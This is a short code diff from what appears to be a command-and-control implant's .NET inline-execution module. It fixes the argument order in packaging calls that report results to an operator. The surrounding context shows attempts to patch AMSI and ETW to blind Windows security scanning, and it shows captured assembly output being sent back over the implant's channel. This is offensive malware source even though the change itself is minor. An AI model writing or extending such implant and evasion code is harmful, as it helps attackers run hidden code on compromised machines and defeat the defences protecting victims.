@@ -81,7 +81,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     /* if ( Instance.Session.OSVersion > WIN_VERSION_10 )
     {
         PUTS( "Try to patch amsi" )
-        PackageInfo = PackageCreateWithRequestID( Instance.Dotnet->RequestID, DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
+        PackageInfo = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, Instance.Dotnet->RequestID );
         PackageAddInt32( PackageInfo, DOTNET_INFO_AMSI_PATCHED );
         if ( AmsiPatched == FALSE )
         {
@@ -107,7 +107,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
 #if _WIN64
         PUTS( "Try to patch(less) Amsi/Etw" )
 
-        PackageInfo = PackageCreateWithRequestID( Instance.Dotnet->RequestID, DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
+        PackageInfo = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, Instance.Dotnet->RequestID );
         PackageAddInt32( PackageInfo, DOTNET_INFO_PATCHED );
 
         /* check if Amsi is loaded */
@@ -153,7 +153,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     }
 
     /* Let the operator know what version we are going to use. */
-    PackageInfo = PackageCreateWithRequestID( Instance.Dotnet->RequestID, DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
+    PackageInfo = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, Instance.Dotnet->RequestID );
     PackageAddInt32( PackageInfo, DOTNET_INFO_NET_VERSION );
     PackageAddBytes( PackageInfo, Instance.Dotnet->NetVersion.Buffer, Instance.Dotnet->NetVersion.Length );
     PackageTransmit( PackageInfo );
@@ -347,7 +347,7 @@ VOID DotnetPushPipe()
             Instance.Win32.ReadFile( Instance.Dotnet->Pipe, Instance.Dotnet->Output.Buffer, Instance.Dotnet->Output.Length, &BytesRead, NULL );
             Instance.Dotnet->Output.Length = BytesRead;
 
-            PPACKAGE Package = PackageCreateWithRequestID( Instance.Dotnet->RequestID, DEMON_OUTPUT );
+            PPACKAGE Package = PackageCreateWithRequestID( DEMON_OUTPUT, Instance.Dotnet->RequestID );
             PackageAddBytes( Package, Instance.Dotnet->Output.Buffer, Instance.Dotnet->Output.Length );
             PackageTransmit( Package );
 
